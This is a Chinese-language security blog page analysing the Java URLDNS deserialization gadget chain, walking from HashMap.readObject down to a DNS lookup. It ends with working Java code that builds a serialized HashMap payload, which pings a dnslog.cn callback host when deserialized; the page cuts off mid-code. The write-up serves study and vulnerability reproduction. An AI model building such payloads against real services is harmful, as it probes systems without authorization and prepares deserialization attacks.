@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Java安全之URLDNS链分析前言今天来复习一下URLDNS这条链，水一篇文章吧。也弥补了Java安全系列的入门必学的一个利用链的文章的空白。URLDNS链本身不能执行命令，多用于构造 DNS 操作的 payload，它被广泛用于演示和测试 Java 序列化的安全性问题。 Java反序列化我们先来学一个简单的序列化和反序列化的demo 这里主要是写了一个可以序列化的Person类，其中包含了两个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全之URLDNS链分析">
+<meta property="og:url" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="Java安全之URLDNS链分析前言今天来复习一下URLDNS这条链，水一篇文章吧。也弥补了Java安全系列的入门必学的一个利用链的文章的空白。URLDNS链本身不能执行命令，多用于构造 DNS 操作的 payload，它被广泛用于演示和测试 Java 序列化的安全性问题。 Java反序列化我们先来学一个简单的序列化和反序列化的demo 这里主要是写了一个可以序列化的Person类，其中包含了两个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/r8S4l8zE1urdmknqisX7h32MiZ1PKyFJ7Yd9zK668gk.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/b4ij8_pwMe9XPhqRbWGbewNWGOBEegADet6hUppCe6E.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/nur94AWOfELaLuQE3Ff-ADQjfzmeS8Ayg2_-_2ICklc.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/eH5rkHYOx1xHiC_7u3yEAOPVi41qiqM6Nel9NUemAbM.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/geOYynHlT0YgGBth3BbQcbKhkAsoFCCAcKlVt8JjiU4.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/iCb6IoAS7nP5u2NtMfku16m_hoTYqLjq_3Z3iU0lads.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/rnP1SnwPxGZ-ddRTbdpzK8xMghudb3k_EcHyTSAx0Wc.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/PsThq7g9BKyALw6jEu7FOgedBSbLg88i1QJW9yDvL4k.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/-FhaNKM2ZOToe87TRVwolWnpwtE8a8sI2beLhQaWex4.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/EuBKFy-s9f77V-0J2GKC7O_75qr_NK_8Bhf6ylqnZiM.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/HmrnyhMcIQ1bLzcTSivhn_32R4ZDJTHc4Utx7382gQw.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/Aqh2cx7izJhK6UWx_xXMwx7MPTLd-3yE6gnAcql688U.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/P4YoVmv1GIhgr2PHyQaAPvdC0Wp3U6ogx0UvAteXQF4.png">
+<meta property="og:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/zSy25BKJKMGCQn_YD6xgkiaeaajw8gdhJPdAa07JemM.png">
+<meta property="article:published_time" content="2023-07-17T11:38:38.000Z">
+<meta property="article:modified_time" content="2023-07-18T10:03:33.570Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/r8S4l8zE1urdmknqisX7h32MiZ1PKyFJ7Yd9zK668gk.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java安全之URLDNS链分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&text=Java安全之URLDNS链分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&is_video=false&description=Java安全之URLDNS链分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java安全之URLDNS链分析&body=Check out this article: https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&title=Java安全之URLDNS链分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&name=Java安全之URLDNS链分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2023/07/17/Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90/&t=Java安全之URLDNS链分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%AE%89%E5%85%A8%E4%B9%8BURLDNS%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Java安全之URLDNS链分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.</span> <span class="toc-text">Java反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URLDNS"><span class="toc-number">1.3.</span> <span class="toc-text">URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ysoserial-URLDNS"><span class="toc-number">1.4.</span> <span class="toc-text">Ysoserial.URLDNS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java安全之URLDNS链分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Garck3h</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-17T11:38:38.000Z" class="dt-published" itemprop="datePublished">2023-07-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Java安全之URLDNS链分析"><a href="#Java安全之URLDNS链分析" class="headerlink" title="Java安全之URLDNS链分析"></a>Java安全之URLDNS链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天来复习一下URLDNS这条链，水一篇文章吧。也弥补了Java安全系列的入门必学的一个利用链的文章的空白。URLDNS链本身不能执行命令，多用于构造 DNS 操作的 payload，它被广泛用于演示和测试 Java 序列化的安全性问题。</p>
+<h2 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h2><p>我们先来学一个简单的序列化和反序列化的demo</p>
+<p>这里主要是写了一个可以序列化的Person类，其中包含了两个属性，分别是name和age。</p>
+<p>在主函数中，我们先实例化一个对象person，然后调用serialize将其进行序列化，并且输出为person.bin，紧接着调用deserialize将person.bin文件进行反序列化为一个deserializedPerson对象，然后通过调用get方法的方式获取其属性值进行输出。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.Javasecure;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2023/7/17 11:17 上午</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个待序列化的对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化person对象到.ser文件</span></span><br><span class="line">        serialize(person, <span class="string">&quot;person.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从.ser文件反序列化对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> deserialize(<span class="string">&quot;person.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印反序列化后的对象信息</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + deserializedPerson.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Age: &quot;</span> + deserializedPerson.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化对象到person.bin文件</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object, String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(fileName);</span><br><span class="line">             <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos)) &#123;</span><br><span class="line">            oos.writeObject(object);</span><br><span class="line">            System.out.println(<span class="string">&quot;Object serialized to &quot;</span> + fileName);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从person.bin文件反序列化对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Person <span class="title function_">deserialize</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName);</span><br><span class="line">             <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Person) ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义可序列化的Person类,包含了两个属性，分别是name和age</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="r8S4l8zE1urdmknqisX7h32MiZ1PKyFJ7Yd9zK668gk.png" alt="image"></p>
+<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用链:</span><br><span class="line">HashMap.readObject(ObjectInputStream in)</span><br><span class="line">   HashMap.putVal()</span><br><span class="line">       HashMap -&gt; hash()</span><br><span class="line">       URL -&gt; hashCode()</span><br><span class="line">           URLStreamHandler -&gt; hashCode()</span><br><span class="line">           URLStreamHandler -&gt; getHostAddress()</span><br><span class="line">       URL -&gt; getHostAddress()</span><br><span class="line">           InetAddress -&gt; getByName()</span><br></pre></td></tr></table></figure>
+<p>首先，我们来看一下HashMap，HashMap是实现了Map&lt;K,V&gt;, Cloneable 和 Serializable 接口；意味着实现它的类可以被序列化。</p>
+<p><img src="b4ij8_pwMe9XPhqRbWGbewNWGOBEegADet6hUppCe6E.png" alt="image"></p>
+<p>然后我们来看到HashMap的readObject。这是重写了readObject，主要进行了读取序列化数据、校验参数、创建哈希表等；从而实现可以确保在反序列化后，HashMap 对象正确地包含之前序列化的键值对。这里我们重点看后面的hash(key)</p>
+<p><img src="nur94AWOfELaLuQE3Ff-ADQjfzmeS8Ayg2_-_2ICklc.png" alt="image"></p>
+<p>跟进 hash ()，可以看到，该方法接收一个 key 参数，这里主要实现计算键的哈希值，这个参数可以是任意类型的对象。</p>
+<p><img src="eH5rkHYOx1xHiC_7u3yEAOPVi41qiqM6Nel9NUemAbM.png" alt="image"></p>
+<p>继续跟进去到了hashCode，返回对象的哈希码</p>
+<p><img src="geOYynHlT0YgGBth3BbQcbKhkAsoFCCAcKlVt8JjiU4.png" alt="image"></p>
+<p>在进行Java开发的过程当中会有很多类会直接或间接调用到hashCode()这个方法。我们点一下左边的按钮可以看到我这个版本的jdk里面大约有1175个方法重写了hashCode。当然我们这里可以直接看到URL类也是重写了hashCode。所以只要能够从前面的HashMap的readObject进入到 hash 以及参数可控，那么我们就可以利用了。</p>
+<p><img src="iCb6IoAS7nP5u2NtMfku16m_hoTYqLjq_3Z3iU0lads.png" alt="image"></p>
+<p>下面看一下URL重写的hashcode；声明一个整型变量 hashCode，并初始化为 -1；然后进行条件判断 (hashCode !&#x3D; -1)，判断是否已经计算过哈希码。如果哈希码等于 -1，表示还未计算过哈希码，则调用 handler.hashCode(this) 方法，传入当前对象作为参数，计算对象的哈希码。</p>
+<p><img src="rnP1SnwPxGZ-ddRTbdpzK8xMghudb3k_EcHyTSAx0Wc.png" alt="image"></p>
+<p>我们跟进到handler.hashCode；实现根据url对象的协议、主机、文件、端口和引用等属性，计算出一个唯一的哈希码作为对象的标识。重点看到353行调⽤ getHostAddress ⽅法，这个是生成主机部分的哈希码；继续跟进</p>
+<p><img src="PsThq7g9BKyALw6jEu7FOgedBSbLg88i1QJW9yDvL4k.png" alt="image"></p>
+<p>在getHostAddress方法中，这里实现获取URL 对象的主机地址对应的 InetAddress 对象。如果没有缓存，会进行一次 DNS 解析来获取主机地址，并将结果进行缓存。这样可以减少重复的 DNS 解析开销，提高性能。</p>
+<p><img src="-FhaNKM2ZOToe87TRVwolWnpwtE8a8sI2beLhQaWex4.png" alt="image"></p>
+<p>这时整体的思路就有了，首先是实例化一个 java.net.url对象，然后调用put传入给hashMap对象。然后再传入一个非-1的值作为参数，这样做是为了确保 HashMap 的插入操作不会触发DNS解析。最后将hashCode 字段的值设置为 -1，以使得在执行利用链时能够触发请求，也就是确保能调用执行handler.hashCode函数。</p>
+<p><img src="EuBKFy-s9f77V-0J2GKC7O_75qr_NK_8Bhf6ylqnZiM.png" alt="image"></p>
+<p>最终写出的一个demo</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.garck3h.Javasecure;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by IntelliJ IDEA.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> Garck3h</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span> 2023/7/17 11:12 上午</span></span><br><span class="line"><span class="comment"> * Life is endless, and there is no end to it.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//实力化一个hashMap对象和一个URL对象</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://cm1b9l.dnslog.cn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这段代码通过反射获取了 url 对象的 hashCode 字段，并将其设置为可访问。</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCodeField</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 避免创建payload时触发请求</span></span><br><span class="line">        hashCodeField.set(url, <span class="number">0</span>);</span><br><span class="line">        hashMap.put(url, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 使利用链执行时能够触发请求</span></span><br><span class="line">        hashCodeField.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反序列化操作，输出为ser.bin文件</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//进行反序列化，以触发DNS解析</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oosin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oosin.readObject();</span><br><span 